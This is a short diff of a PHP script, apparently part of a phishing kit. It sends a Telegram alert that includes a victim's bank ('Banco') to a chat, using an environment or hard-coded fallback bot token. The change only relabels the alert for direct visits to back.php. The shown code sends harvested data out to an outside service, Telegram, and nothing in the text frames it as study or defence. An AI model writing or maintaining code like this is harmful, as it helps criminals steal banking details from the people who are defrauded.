@@ -52,7 +52,7 @@ $FALLBACK_CHAT_ID_LEGACY   = "-4801629674";
 $token   = getenv('TELEGRAM_BOT_TOKEN_OPS') ?: $FALLBACK_BOT_TOKEN_LEGACY;
 $chat_id = getenv('TELEGRAM_CHAT_ID_OPS')   ?: $FALLBACK_CHAT_ID_LEGACY;
 
-$mensaje  = "📥 Nueva Ingreso Verde:\n";
+$mensaje  = "🌱 <b>[INGRESO VERDE]</b> Entrada directa back.php (sin landing anterior):\n";
 $mensaje .= "🏦 Banco: $banco\n";
 
 $url = "https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
